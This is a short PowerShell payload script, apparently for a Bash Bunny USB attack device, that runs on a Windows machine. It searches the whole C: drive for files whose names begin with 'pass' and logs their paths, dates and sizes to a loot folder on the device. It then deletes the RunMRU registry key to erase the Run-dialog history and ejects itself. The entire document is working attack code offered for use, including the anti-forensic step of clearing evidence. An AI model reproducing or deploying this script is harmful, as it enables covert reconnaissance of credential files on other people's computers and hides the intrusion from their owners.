#Creator: A_SarcasticGuy
#Title: FileExfilInfo
#Target: Windows

#Check if CapsLock key is enabled
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}

#Get the drive letter
$n = (gwmi win32_volume -f 'label=''BASHBUNNY''').Name

#Create directory in loot folder to store file
mkdir $n\loot\Exfil\$env:computername

#Find files beginning with phrase "pass*" in the directory (and sub-directories) of "C:\" ("pass*" and "C:\" are defaults, and can be changed to suit)
forfiles /P "C:\" /s /m "pass*" -c "cmd /c echo @isdir @fdate @ftime @path @fsize" >> $n\loot\Exfil\$env:computername\$(get-date -f dd-MM-yyy-hh-mm-ss).txt

#Delete registry key to remove run dialog history
REG delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

Sleep 10

#Eject Bunny when exfil is completed as search time can vary
$Eject = New-Object -ComObject Shell.Application
$Eject.NameSpace(17).ParseName($n).InvokeVerb("Eject")

#N.B Bunny will not eject if still in use, and scans can take quite a large amount of time, for example if scanning a full Hard Disk.

#Close Powershell process, should it still remain open
$host.SetShouldExit(0)